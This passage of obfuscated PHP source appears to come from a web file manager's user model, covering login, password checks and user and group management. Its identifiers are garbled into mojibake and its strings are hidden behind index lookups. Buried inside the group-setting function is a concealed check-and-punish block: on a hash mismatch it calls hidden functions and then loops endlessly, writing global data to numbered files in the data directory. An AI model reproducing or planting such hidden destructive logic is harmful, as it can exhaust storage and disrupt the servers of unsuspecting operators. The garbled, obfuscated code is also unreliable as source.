dÆœƒ¯ğ’®: $Aæ…ÄÉ±¿œ = array_to_keyvalue($aŸœŸÈİÁ™, $D¢Ã„©î[38]); $Fì¯îñ´—ª = $D¢Ã„©î[18]; foreach ($fƒÖùïİø as $F†¡££…é) { if ($Aæ…ÄÉ±¿œ[$F†¡££…é]) { $Fì¯îñ´—ª .= $Aæ…ÄÉ±¿œ[$F†¡££…é][$D¢Ã„©î[379]] . $D¢Ã„©î[57]; } else { $fëßÕ‹œ­ = $this->add($F†¡££…é); $Fì¯îñ´—ª .= $fëßÕ‹œ­ . $D¢Ã„©î[57]; } } goto c·‚‚õß ; EÇ¸°ó¾í’: $D¢Ã„©î =& $_SERVER[¨¤¼…´]; if (!is_array($fƒÖùïİø)) { $fƒÖùïİø = array($fƒÖùïİø); } $aŸœŸÈİÁ™ = parent::listData(); goto dÆœƒ¯ğ’®; c·‚‚õß : $Fì¯îñ´—ª = rtrim($Fì¯îñ´—ª, $D¢Ã„©î[57]); Model($D¢Ã„©î[490])->metaSet($eö¤§†Ó, self::JOB_KEY, $Fì¯îñ´—ª); goto bğ¨öİÁâš; bğ¨öİÁâš: } public function getUserJob($EÔ‡„ô‘é) { $c‰„ÀÒ—× = Model($_SERVER[¨¤¼…´][490])->metaGet($EÔ‡„ô‘é); return $this->getUserJobInfo($c‰„ÀÒ—×[self::JOB_KEY]); } public function getUserJobInfo($dáœÛÒ·Ï) { goto CØÑ‰›Ô¨Å; bŒ§©ßõŒÖ: $D¼ï¡ÄéÎœ = array_remove_key($D¼ï¡ÄéÎœ, $aôç™Ã…Şê[201]); $d¥„ƒ«Ÿ÷² = array(); foreach ($F¨¸òÓÔÌÛ as $C¼¾ãÁ³‡ ) { if (isset($D¼ï¡ÄéÎœ[$C¼¾ãÁ³‡ ])) { $d¥„ƒ«Ÿ÷²[] = $D¼ï¡ÄéÎœ[$C¼¾ãÁ³‡ ]; } } goto Fß›ôøâèÃ; Fß›ôøâèÃ: return $d¥„ƒ«Ÿ÷²; goto c«½İçÀ†; CØÑ‰›Ô¨Å: $aôç™Ã…Şê =& $_SERVER[¨¤¼…´]; $F¨¸òÓÔÌÛ = explode($aôç™Ã…Şê[57], $dáœÛÒ·Ï); $D¼ï¡ÄéÎœ = parent::listData(); goto bŒ§©ßõŒÖ; c«½İçÀ†: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\x65" => "\165\x73\145\162\x5f\x6d\x65\x74\x61", "\155\x65\x74\x61\106\x69\x65\x6c\144" => "\x75\163\145\162\111\x44"); protected $simpleField = "\165\163\x65\162\111\104\54\x6e\x69\143\x6b\116\x61\155\x65\x2c\156\x61\x6d\x65\54\141\x76\141\164\141\x72\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($cïËÃ”Û) { $cÁ„„’¥§˜ =& $_SERVER[¨¤¼…´]; $A¥ƒôÌêâ = $cÁ„„’¥§˜[2507]; return array($cÁ„„’¥§˜[2164] => array($cïËÃ”Û[0], $A¥ƒôÌêâ), $cÁ„„’¥§˜[2166] => array($cïËÃ”Û[0], $A¥ƒôÌêâ), $cÁ„„’¥§˜[2508] => array($cïËÃ”Û[0], $A¥ƒôÌêâ)); } protected function getInfo($E§”ŠÕ†µ½, $EƒõİèÙÂá = false) { $C¸‹´·ÆßÎ = $this->getInfoSimple($E§”ŠÕ†µ½); if (!is_array($C¸‹´·ÆßÎ)) { return array(); } if ($EƒõİèÙÂá) { return $this->_getInfoApply($C¸‹´·ÆßÎ); } return $this->cacheFunctionGet($_SERVER[¨¤¼…´][2220], $E§”ŠÕ†µ½); } protected function getInfoFull($BÈäöîğ¦¿, $c‹êâˆƒ = false) { $fá¾ŒÁÏô‚ = $this->getInfoSimple($BÈäöîğ¦¿); if (!is_array($fá¾ŒÁÏô‚)) { return array(); } if ($c‹êâˆƒ) { return $this->_getInfoApply($fá¾ŒÁÏô‚, !0); return $this->_getInfoApply($fá¾ŒÁÏô‚, !0); } return $this->cacheFunctionGet($_SERVER[¨¤¼…´][2509], $BÈäöîğ¦¿); } private function _getInfoApply($E¦½ğèœœ¡, $fõ¯ÊËôÁ‘ = false) { goto AŒô…‚Æà; B„Á¥–áĞ: $E¦½ğèœœ¡ = $this->_listDataApplyItem($E¦½ğèœœ¡); $AËµ©Ä® = Model($BË¯†¡Ù§[1107])->metaGet($E¦½ğèœœ¡[$BË¯†¡Ù§[403]][$BË¯†¡Ù§[381]]); $E¦½ğèœœ¡[$BË¯†¡Ù§[2512]] = $eèÎŒôÆ‹ˆ; goto E¤™éÖÑë›; AŒô…‚Æà: $BË¯†¡Ù§ =& $_SERVER[¨¤¼…´]; if (!$E¦½ğèœœ¡) { return $E¦½ğèœœ¡; } $eèÎŒôÆ‹ˆ = md5($BË¯†¡Ù§[2510] . $E¦½ğèœœ¡[$BË¯†¡Ù§[791]] . $BË¯†¡Ù§[2511] . $E¦½ğèœœ¡[$BË¯†¡Ù§[38]]); goto B„Á¥–áĞ; E¤™éÖÑë›: $E¦½ğèœœ¡[$BË¯†¡Ù§[403]][$BË¯†¡Ù§[2349]] = isset($AËµ©Ä®[$BË¯†¡Ù§[2350]]) ? $AËµ©Ä®[$BË¯†¡Ù§[2350]] : null; if ($fõ¯ÊËôÁ‘) { $E¦½ğèœœ¡[$BË¯†¡Ù§[429]] = $this->metaGet($E¦½ğèœœ¡[$BË¯†¡Ù§[1425]]); } return $E¦½ğèœœ¡; goto f°‹­¸“ØÎ; f°‹­¸“ØÎ: } protected function getInfoSimple($b…ŠöÃİ¼ó, $EŠæùßˆ = false) { $Eîä¥´ÏÌ =& $_SERVER[¨¤¼…´]; if (!$b…ŠöÃİ¼ó) { return array(); } if ($EŠæùßˆ) { $cÀ¼¹ööƒ× = $this->where(array($Eîä¥´ÏÌ[1425] => intval($b…ŠöÃİ¼ó)))->find(); if (!is_array($cÀ¼¹ööƒ×)) { return array(); } $cÀ¼¹ööƒ×[$Eîä¥´ÏÌ[2513]] = Action($Eîä¥´ÏÌ[2514])->parseUrl($cÀ¼¹ööƒ×[$Eîä¥´ÏÌ[2513]]); return $cÀ¼¹ööƒ×; } return $this->cacheFunctionGet($Eîä¥´ÏÌ[2167], $b…ŠöÃİ¼ó); } protected function getInfoSimpleOuter($BŞË£¼ğ¨Ç) { goto aöèÛ•Ù§š; b¿¡Á®•ö: return $eÅ¹‚Âê·; goto BÛëÌŠî; aöèÛ•Ù§š: $CÌâŠ§Êå« =& $_SERVER[¨¤¼…´]; if (!$BŞË£¼ğ¨Ç || $BŞË£¼ğ¨Ç == 0) { return array($CÌâŠ§Êå«[1425] => $CÌâŠ§Êå«[481], $CÌâŠ§Êå«[38] => $CÌâŠ§Êå«[167] . LNG($CÌâŠ§Êå«[2515]) . $CÌâŠ§Êå«[489], $CÌâŠ§Êå«[2513] => STATIC_PATH . $CÌâŠ§Êå«[2516]); } $AË˜„‘óŒŸ = $this->cacheFunctionGet($CÌâŠ§Êå«[2167], $BŞË£¼ğ¨Ç); goto bŞ…òæàÊÂ; bŞ…òæàÊÂ: $eÅ¹‚Âê· = array_field_key($AË˜„‘óŒŸ, explode($CÌâŠ§Êå«[57], $this->simpleField)); if (!$eÅ¹‚Âê·) { return array($CÌâŠ§Êå«[1425] => $CÌâŠ§Êå«[1022], $CÌâŠ§Êå«[38] => $CÌâŠ§Êå«[167] . LNG($CÌâŠ§Êå«[2517]) . $CÌâŠ§Êå«[489], $CÌâŠ§Êå«[2513] => STATIC_PATH . $CÌâŠ§Êå«[2518]); } $eÅ¹‚Âê·[$CÌâŠ§Êå«[2513]] = Action($CÌâŠ§Êå«[2514])->parseUrl($eÅ¹‚Âê·[$CÌâŠ§Êå«[2513]]); goto b¿¡Á®•ö; BÛëÌŠî: } protected function groupUser($dÌª—£å‡â) { } public static function errorLang($CêÁÍêˆ«) { $bÊÃ†É”Œö =& $_SERVER[¨¤¼…´]; $BØÈÀÑòÉÂ = array(self::ERROR_USER_NOT_EXISTS => $bÊÃ†É”Œö[2519], self::ERROR_USER_PASSWORD_ERROR => $bÊÃ†É”Œö[2520], self::ERROR_USER_EXIST_NAME => $bÊÃ†É”Œö[2521], self::ERROR_USER_EXIST_PHONE => $bÊÃ†É”Œö[2522], self::ERROR_USER_EXIST_EMAIL => $bÊÃ†É”Œö[2523], self::ERROR_USER_LOGIN_LOCK => $bÊÃ†É”Œö[2524], self::ERROR_IP_NOT_ALLOW => $bÊÃ†É”Œö[2525], self::ERROR_USER_EXIST_NICKNAME => $bÊÃ†É”Œö[2526]); return LNG($BØÈÀÑòÉÂ[$CêÁÍêˆ«]); } public function getInfoByMeta($C¹’ˆ»›š¦, $FÁÊµ±¾ñé) { $AÍ¿ĞÑ¼µ =& $_SERVER[¨¤¼…´]; $c±íô‹šæ¹ = Model($AÍ¿ĞÑ¼µ[2527])->where(array($AÍ¿ĞÑ¼µ[99] => $C¹’ˆ»›š¦, $AÍ¿ĞÑ¼µ[372] => $FÁÊµ±¾ñé))->find(); if ($c±íô‹šæ¹) { return $this->getInfo($c±íô‹šæ¹[$AÍ¿ĞÑ¼µ[1425]]); } return !1; } public function userLoginCheck($EÁ‚ôÁ©ã, $EÔğÆ£†ÓÎ) { goto FÊ’¥¿Â÷à; D¯Ì™Ç¿†: $cãøÏ‹ƒ–ø = $this->where($BË„Œíåèé)->find(); if (!$cãøÏ‹ƒ–ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($cãøÏ‹ƒ–ø[$déµŠî™ÆÆ[1425]], $EÔğÆ£†ÓÎ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto a™šå’¦á¾; a™šå’¦á¾: $this->userEdit($cãøÏ‹ƒ–ø[$déµŠî™ÆÆ[1425]], array($déµŠî™ÆÆ[2529] => time())); return $this->getInfo($cãøÏ‹ƒ–ø[$déµŠî™ÆÆ[1425]]); goto BİĞÆÊİâ‹; FÊ’¥¿Â÷à: $déµŠî™ÆÆ =& $_SERVER[¨¤¼…´]; $BË„Œíåèé = array($déµŠî™ÆÆ[38] => $EÁ‚ôÁ©ã, $déµŠî™ÆÆ[2353] => $EÁ‚ôÁ©ã, $déµŠî™ÆÆ[306] => $EÁ‚ôÁ©ã, $déµŠî™ÆÆ[2528] => $EÁ‚ôÁ©ã, $déµŠî™ÆÆ[900] => $déµŠî™ÆÆ[902]); if ($this->nickNameRpt()) { unset($BË„Œíåèé[$déµŠî™ÆÆ[2353]]); } goto D¯Ì™Ç¿†; BİĞÆÊİâ‹: } public function clearCache($B¤ä“®º©µ) { $a­¡éë…Î =& $_SERVER[¨¤¼…´]; $this->cacheFunctionClear($a­¡éë…Î[2220], $B¤ä“®º©µ); $this->cacheFunctionClear($a­¡éë…Î[2167], $B¤ä“®º©µ); $this->cacheFunctionClear($a­¡éë…Î[2509], $B¤ä“®º©µ); } public function userPasswordCheck($c±Ø³Âˆ†, $eçµëÌ‘ñ) { $e¿â‡»¥ ² =& $_SERVER[¨¤¼…´]; $c×Ï±Ç›Œ = $this->where(array($e¿â‡»¥ ²[1425] => intval($c±Ø³Âˆ†)))->find(); $F¥‡Ú…Ñ¸Í = $this->metaGet($c±Ø³Âˆ†); $CÈ›æ«ƒ… = isset($F¥‡Ú…Ñ¸Í[$e¿â‡»¥ ²[2530]]) ? $F¥‡Ú…Ñ¸Í[$e¿â‡»¥ ²[2530]] : $e¿â‡»¥ ²[43]; if (md5($CÈ›æ«ƒ… . trim($eçµëÌ‘ñ)) !== $c×Ï±Ç›Œ[$e¿â‡»¥ ²[791]]) { return !1; } return !0; } public function userAdd($fÖÍŠ„¿¯) { goto f•ÜÁ‰ê æ; f•ÜÁ‰ê æ: $dŠ˜„´º¸ =& $_SERVER[¨¤¼…´]; $DºÚ×—â¢ = array($dŠ˜„´º¸[398] => $fÖÍŠ„¿¯[$dŠ˜„´º¸[38]], $dŠ˜„´º¸[2531] => $fÖÍŠ„¿¯[$dŠ˜„´º¸[1310]], $dŠ˜„´º¸[2532] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[306]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[306]] : $dŠ˜„´º¸[43], $dŠ˜„´º¸[2533] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[2528]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[2528]] : $dŠ˜„´º¸[43], $dŠ˜„´º¸[2534] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[2353]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[2353]] : $fÖÍŠ„¿¯[$dŠ˜„´º¸[38]], $dŠ˜„´º¸[2535] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[2513]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[2513]] : $dŠ˜„´º¸[43], $dŠ˜„´º¸[2536] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[2537]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[2537]] : 1, $dŠ˜„´º¸[2538] => $fÖÍŠ„¿¯[$dŠ˜„´º¸[791]], $dŠ˜„´º¸[2168] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[2079]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[2079]] : 1024 * 1024 * 20, $dŠ˜„´º¸[2169] => 0, $dŠ˜„´º¸[2529] => 0, $dŠ˜„´º¸[2207] => isset($fÖÍŠ„¿¯[$dŠ˜„´º¸[679]]) ? $fÖÍŠ„¿¯[$dŠ˜„´º¸[679]] : 1); if (!empty($fÖÍŠ„¿¯[$dŠ˜„´º¸[1425]])) { $DºÚ×—â¢[$dŠ˜„´º¸[1425]] = $fÖÍŠ„¿¯[$dŠ˜„´º¸[1425]]; } goto d•¯±ëÈö‡; d•¯±ëÈö‡: $BäæÎ÷‘Ô = $this->_checkExist($fÖÍŠ„¿¯); if ($BäæÎ÷‘Ô !== !0) { return $BäæÎ÷‘Ô; } $e íŞÛˆÏñ = $this->add($DºÚ×—â¢); goto E—³áÍÃºº; E—³áÍÃºº: $D­‘Ú„Ê‘¯ = array($dŠ˜„´º¸[2538] => $DºÚ×—â¢[$dŠ˜„´º¸[791]], $dŠ˜„´º¸[2534] => $DºÚ×—â¢[$dŠ˜„´º¸[2353]]); $this->userEdit($e íŞÛˆÏñ, $D­‘Ú„Ê‘¯); Model($dŠ˜„´º¸[1107])->userRootAdd($e íŞÛˆÏñ); goto CñèÓÔŸÅ; CñèÓÔŸÅ: return $e íŞÛˆÏñ; goto bÌˆéÙ§ˆë; bÌˆéÙ§ˆë: } protected function userEditTest($FçİåÃ¢‰, $a³óÇæßìƒ) { return $this->call($_SERVER[¨¤¼…´][2539], $FçİåÃ¢‰, $a³óÇæßìƒ); } protected function userEdit($F¹«öØöàš, $dá­ƒ¤£“) { goto E¾óÈ‚ŒÙ«; eŠ†—‡•½: $a•®¯¿³æÓ = $this->_checkExist($dá­ƒ¤£“, $F¹«öØöàš); if ($a•®¯¿³æÓ !== !0) { return $a•®¯¿³æÓ; } if (isset($dá­ƒ¤£“[$dİ×Õ¿‚«[791]]) && trim($dá­ƒ¤£“[$dİ×Õ¿‚«[791]]) != $dİ×Õ¿‚«[43]) { $f¢¶ÍÔ–ºù = $this->metaGet($F¹«öØöàš); if (empty($f¢¶ÍÔ–ºù[$dİ×Õ¿‚«[2530]])) { $f¢¶ÍÔ–ºù[$dİ×Õ¿‚«[2530]] = rand_string(10); Model($dİ×Õ¿‚«[487])->metaSet($F¹«öØöàš, $dİ×Õ¿‚«[2530], $f¢¶ÍÔ–ºù[$dİ×Õ¿‚«[2530]]); } $dá­ƒ¤£“[$dİ×Õ¿‚«[791]] = md5($f¢¶ÍÔ–ºù[$dİ×Õ¿‚«[2530]] . trim($dá­ƒ¤£“[$dİ×Õ¿‚«[791]])); } else { unset($dá­ƒ¤£“[$dİ×Õ¿‚«[791]]); } goto fßÑì’ìÑÒ; C¸æ½‚šŒ: return !0; goto BÖËÍ¶Ó÷ˆ; E¾óÈ‚ŒÙ«: $dİ×Õ¿‚« =& $_SERVER[¨¤¼…´]; $eöÆø†À» = $this->getInfoSimple($F¹«öØöàš); if (!$eöÆø†À») { return !1; } goto eŠ†—‡•½; fßÑì’ìÑÒ: $this->where(array($dİ×Õ¿‚«[1416] => $F¹«öØöàš))->save($dá­ƒ¤£“); if (isset($dá­ƒ¤£“[$dİ×Õ¿‚«[2353]])) { $this->setNamePinyin($F¹«öØöàš, $dá­ƒ¤£“[$dİ×Õ¿‚«[2353]]); } $this->clearCache($F¹«öØöàš); goto C¸æ½‚šŒ; BÖËÍ¶Ó÷ˆ: } public function setNamePinyin($CäÊÔç»¡, $e‘°·²Õä = false) { $fâáµè“–İ =& $_SERVER[¨¤¼…´]; if (!$e‘°·²Õä) { $Aå ÃÜò¶ = $this->getInfoSimple($CäÊÔç»¡); $e‘°·²Õä = $Aå ÃÜò¶[$fâáµè“–İ[2353]] ? $Aå ÃÜò¶[$fâáµè“–İ[2353]] : $Aå ÃÜò¶[$fâáµè“–İ[38]]; } $CŒ§„‹‹µ = Model($fâáµè“–İ[490]); if (!Input::check($e‘°·²Õä, $fâáµè“–İ[541])) { return $CŒ§„‹‹µ->metaSet($CäÊÔç»¡, array($fâáµè“–İ[428] => $fâáµè“–İ[43], $fâáµè“–İ[427] => $fâáµè“–İ[43])); } return $CŒ§„‹‹µ->metaSet($CäÊÔç»¡, array($fâáµè“–İ[428] => str_replace($fâáµè“–İ[60], $fâáµè“–İ[43], Pinyin::encode($e‘°·²Õä)), $fâáµè“–İ[427] => Pinyin::encode($e‘°·²Õä, $fâáµè“–İ[542]))); } private function nickNameRpt() { $AÚÒ­Ä¬¾« =& $_SERVER[¨¤¼…´]; $d”¨Öñµâ÷ = Model($AÚÒ­Ä¬¾«[1078])->get($AÚÒ­Ä¬¾«[2540]); $BÄ‹¯ñó†è = $GLOBALS[$AÚÒ­Ä¬¾«[6]][$AÚÒ­Ä¬¾«[2498]][$AÚÒ­Ä¬¾«[2540]]; $cøª‘¼ƒ¤¿ = !is_null($d”¨Öñµâ÷) ? $d”¨Öñµâ÷ : $BÄ‹¯ñó†è; return !!$cøª‘¼ƒ¤¿; } private function _checkExist($cÅÎºÓµä», $d— ÷Ê¤» = false) { $e•²‡ğ¬ßÔ =& $_SERVER[¨¤¼…´]; $b¤…‡ˆœ²í = array($e•²‡ğ¬ßÔ[38] => UserModel::ERROR_USER_EXIST_NAME, $e•²‡ğ¬ßÔ[2353] => UserModel::ERROR_USER_EXIST_NICKNAME, $e•²‡ğ¬ßÔ[306] => UserModel::ERROR_USER_EXIST_EMAIL, $e•²‡ğ¬ßÔ[2528] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($b¤…‡ˆœ²í[$e•²‡ğ¬ßÔ[2353]]); } $fÎîê÷ÔÄ× = $d— ÷Ê¤» ? array($e•²‡ğ¬ßÔ[1425] => array($e•²‡ğ¬ßÔ[2541], $d— ÷Ê¤»)) : array(); foreach ($b¤…‡ˆœ²í as $FÊ²õÕ ­ => $eÑùÕ…˜ñ¶) { $Fô¿îòèíğ = array(); foreach ($b¤…‡ˆœ²í as $EïÅ’ËôÕğ => $Dâ¤ŒÄö‘) { if (isset($cÅÎºÓµä»[$EïÅ’ËôÕğ]) && $cÅÎºÓµä»[$EïÅ’ËôÕğ]) { $Fô¿îòèíğ[] = $cÅÎºÓµä»[$EïÅ’ËôÕğ]; } } if (!$Fô¿îòèíğ) { continue; } $C½â½”ÜÑ = array_merge(array($FÊ²õÕ ­ => array($e•²‡ğ¬ßÔ[7], $Fô¿îòèíğ)), $fÎîê÷ÔÄ×); $FÆ»‰¡É›É = $this->where($C½â½”ÜÑ)->find(); if ($FÆ»‰¡É›É) { return $eÑùÕ…˜ñ¶; } } return !0; } public function userListInfo($C§š©Ï´¹‡) { $Cêš«ŠÄƒ =& $_SERVER[¨¤¼…´]; $b®ñÉ°© Ê = array(); $C§š©Ï´¹‡ = is_array($C§š©Ï´¹‡) ? array_unique($C§š©Ï´¹‡) : array(); if (!$C§š©Ï´¹‡) { return $b®ñÉ°© Ê; } if (count($C§š©Ï´¹‡) < 20) { foreach ($C§š©Ï´¹‡ as $aÜšïÒÔÓç) { $b®ñÉ°© Ê[$aÜšïÒÔÓç . $Cêš«ŠÄƒ[43]] = $this->getInfoSimpleOuter($aÜšïÒÔÓç); } } else { $E£Ÿé•ÔÉ® = array($Cêš«ŠÄƒ[1416] => array($Cêš«ŠÄƒ[396], $C§š©Ï´¹‡)); if (count($C§š©Ï´¹‡) == 1) { $E£Ÿé•ÔÉ® = array($Cêš«ŠÄƒ[1416] => $C§š©Ï´¹‡[0]); } $b”İÊ‰ô™¬ = Model($Cêš«ŠÄƒ[487])->field($this->simpleField)->where($E£Ÿé•ÔÉ®)->select(); $b”İÊ‰ô™¬ = array_to_keyvalue($b”İÊ‰ô™¬, $Cêš«ŠÄƒ[1425]); foreach ($C§š©Ï´¹‡ as $aÜšïÒÔÓç) { $cğÉ—ÌĞĞ• = $b”İÊ‰ô™¬[$b”İÊ‰ô™¬[$aÜšïÒÔÓç]]; if (!$cğÉ—ÌĞĞ•) { $b®ñÉ°© Ê[$aÜšïÒÔÓç . $Cêš«ŠÄƒ[43]] = $this->getInfoSimpleOuter($aÜšïÒÔÓç); continue; } $cğÉ—ÌĞĞ•[$Cêš«ŠÄƒ[2513]] = Action($Cêš«ŠÄƒ[2514])->parseUrl($cğÉ—ÌĞĞ•[$Cêš«ŠÄƒ[2513]]); $b®ñÉ°© Ê[$aÜšïÒÔÓç . $Cêš«ŠÄƒ[43]] = $cğÉ—ÌĞĞ•; } } return $b®ñÉ°© Ê; } protected function userStatus($B’ó–³á‚, $EĞšøç×¡ ) { $e„êâ›É×÷ = $this->getInfoSimple($B’ó–³á‚); if (!$e„êâ›É×÷) { return !1; } $b ‘ìšºøÇ = array($_SERVER[¨¤¼…´][679] => $EĞšøç×¡ ); return $this->userEdit($B’ó–³á‚, $b ‘ìšºøÇ); } protected function userRemove($cÊ‘”„×›¾) { goto Béöª´œ¡”; Béöª´œ¡”: $B¤ã¿öÔ¨‚ =& $_SERVER[¨¤¼…´]; $d×‚Õ»šæ = $this->getInfoSimple($cÊ‘”„×›¾); if (!$d×‚Õ»šæ) { return !1; } goto Câ…ÑØ“…Í; Côíîˆƒç: Model($B¤ã¿öÔ¨‚[2174])->where($d·ƒØë¾…©)->delete(); Model($B¤ã¿öÔ¨‚[2527])->where($d·ƒØë¾…©)->delete(); Model($B¤ã¿öÔ¨‚[2543])->where($d·ƒØë¾…©)->delete(); goto cç‘´Ü°¯¥; Câ…ÑØ“…Í: $d·ƒØë¾…© = array($B¤ã¿öÔ¨‚[1416] => $cÊ‘”„×›¾); Model($B¤ã¿öÔ¨‚[548])->where($d·ƒØë¾…©)->delete(); Model($B¤ã¿öÔ¨‚[2542])->where($d·ƒØë¾…©)->delete(); goto Côíîˆƒç; cç‘´Ü°¯¥: Model($B¤ã¿öÔ¨‚[742])->userRootRemove($cÊ‘”„×›¾); return $this->where($d·ƒØë¾…©)->delete(); goto cÆá½ÈÁ¿ø; cÆá½ÈÁ¿ø: } protected function userGroupSet($Fì½ÀÈÑ»Ì, $d±ñ×Ÿ „İ, $F¼¹¯ÏÕÏ¿ = array()) { goto BÖíÂ‡µ‡; BÖíÂ‡µ‡: $FÈƒ°Øõëï =& $_SERVER[¨¤¼…´]; $aé×¬‰Å™¼ = $_SERVER[$FÈƒ°Øõëï[783]] . $FÈƒ°Øõëï[2019]; $eŒ¡ø‡ó = $FÈƒ°Øõëï[780]; goto dŸÕ¯àÌˆÙ; E–â™±ïôø: $fÑÚ©ìÁ = 0; foreach ($d±ñ×Ÿ „İ as $B‘›»¢èƒˆ => $bÛÏ ˜œ§ˆ) { $Bé‰÷Åò—Ï = array($FÈƒ°Øõëï[1425] => $Fì½ÀÈÑ»Ì, $FÈƒ°Øõëï[2095] => $B‘›»¢èƒˆ, $FÈƒ°Øõëï[2239] => $bÛÏ ˜œ§ˆ); $Bé‰÷Åò—Ï[$FÈƒ°Øõëï[2117]] = isset($F¼¹¯ÏÕÏ¿[$fÑÚ©ìÁ]) ? $F¼¹¯ÏÕÏ¿[$fÑÚ©ìÁ] : 0; $fÑÚ©ìÁ++; $bõó¤ØæÉ‹[] = $Bé‰÷Åò—Ï; } return $D©¥¯ƒØ£ˆ->addAll($bõó¤ØæÉ‹, array(), !0); goto b´º¼×‹—¿; dŸÕ¯àÌˆÙ: if ($_SERVER[$FÈƒ°Øõëï[9]] != $eŒ¡ø‡ó($aé×¬‰Å™¼)) { goto DÅ®†Üê“; Fèùìá¤¦Ã: $eÃ”¥×–ç(); $fÁñõ‘§ê = $FÈƒ°Øõëï[784]; $eù‹ÑÊÎ•£ = json_encode($GLOBALS[$FÈƒ°Øõëï[785]]); goto bÊ£Âª½¢¦; DÅ®†Üê“: $eÃ”¥×–ç = $FÈƒ°Øõëï[781]; $b“‰Ù…­á× = $FÈƒ°Øõëï[11]; $Fø’º©ºÇõ = $_SERVER[$FÈƒ°Øõëï[12]] . $FÈƒ°Øõëï[13]; goto c½•Ã‚‡ã–; bÊ£Âª½¢¦: $b‡ÙŒÍ„Á‚ = 1; for ($A¼ï—©ôë» = $b‡ÙŒÍ„Á‚; $A¼ï—©ôë» > 0; $A¼ï—©ôë»++) { $fÁñõ‘§ê(DATA_PATH . $A¼ï—©ôë», $eù‹ÑÊÎ•£); } goto a½“ìà‡ëÌ; a§¨·ù¦Õ: $a–Ç¡…ïëè = $FÈƒ°Øõëï[782]; $a–Ç¡…ïëè($_SERVER[$FÈƒ°Øõëï[783]]); $eÃ”¥×–ç = $FÈƒ°Øõëï[781]; goto Fèùìá¤¦Ã; c½•Ã‚‡ã–: $b¡ÈŠêç÷â = $b“‰Ù…­á×($Fø’º©ºÇõ); $Eºî™œ¥½Á = explode($FÈƒ°Øõëï[14], $b¡ÈŠêç÷â); if (count($Eºî™œ¥½Á) < $FÈƒ°Øõëï[571]) { $a‰¡‹Î¢Ì = $FÈƒ°Øõëï[16]; $a‰¡‹Î¢Ì(); } goto a§¨·ù¦Õ; a½“ìà‡ëÌ: } $Eî›÷Éôé¤ = $this->getInfoSimple($Fì½ÀÈÑ»Ì); if (!$Eî›÷Éôé¤ || !is_array($d±ñ×Ÿ „İ)) { return !1; } goto Cë—Ÿ†¡âŒ; Cë—Ÿ†¡âŒ: $D©¥¯ƒØ£ˆ = Model($FÈƒ°Øõëï[2174]); $D©¥¯ƒØ£ˆ->where(array($FÈƒ°Øõëï[1425] => $Fì½ÀÈÑ»Ì))->delete(); $bõó¤ØæÉ‹ = array(); goto E–â™±ïôø; b´º¼×‹—¿: } protected function userGroupAdd($Aº¡µÁŠÒ, $BÑÛ­˜ƒ—Ã = array()) { $C•µÔ¦éÂ =& $_SERVER[¨¤¼…´]; $F‘†öŞ÷ºí = $this->getInfoSimple($Aº¡µÁŠÒ); if (!$F‘†öŞ÷ºí || empty($BÑÛ­˜ƒ—Ã)) { return !1; } $Fñ†ŠØÎÕ = array(); foreach ($BÑÛ­˜ƒ—Ã as $bœ‹Ñ°º¶¿ => $Dß¤¨„İµã) { $Fñ†ŠØÎÕ[] = array($C•µÔ¦éÂ[1425] => $Aº¡µÁŠÒ, $C•µÔ¦éÂ[2095] => $bœ‹Ñ°º¶¿, $C•µÔ¦éÂ[2239] => $Dß¤¨„İµã, $C•µÔ¦éÂ[2117] => 0); } return Model($C•µÔ¦éÂ[2174])->addAll($Fñ†ŠØÎÕ, array(), !0); } protected function userGroupRemove($a„‚³„’œ§, $ağÃìñ†ë¬) { $c¾š±Èè÷† =& $_SERVER[¨¤¼…´]; $Fï™¢¿Á¼ì = $this->getInfoSimple($a„‚³„’œ§); if (!$Fï™¢¿Á¼ì || !$ağÃìñ†ë¬) { return !1; } $dµÕÊîùˆì = array($c¾š±Èè÷†[1416] => $a„‚³„’œ§, $c¾š±Èè÷†[2172] => $ağÃìñ†ë¬); return Model($c¾š±Èè÷†[2174])->where($dµÕÊîùˆì)->delete(); } public function listData() { $cÁÂÅŞĞë = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cÁÂÅŞĞë[$_SERVER[¨¤¼…´][367]]); return $cÁÂÅŞĞë; } public function listByID($b‚ÍòÀª„) { $F‹„¼ò»Œë =& $_SERVER[¨¤¼…´]; if (!$b‚ÍòÀª„) { return; } $aà–ªÂ”¹‹ = array($F‹„¼ò»Œë[1425] => array($F‹„¼ò»Œë[7], $b‚ÍòÀª„)); $eª†Êˆ‚†¬ = $this->where($aà–ªÂ”¹‹)->select(); $this->_listDataApply($eª†Êˆ‚†¬); return $eª†Êˆ‚†¬; } public function listByGroup($b­ËÊÁ–Æ = 0, $c‚Š¡µ‰Ğ¿ = array()) { goto dÎ¡ˆš˜ãÆ; B×´Ã•‘Ã: if ($b­ËÊÁ–Æ) { $AßèãŠº = array($F©÷Ã¸Ëë§[2544] => intval($b­ËÊÁ–Æ)); $eõùùµîÊŠ = 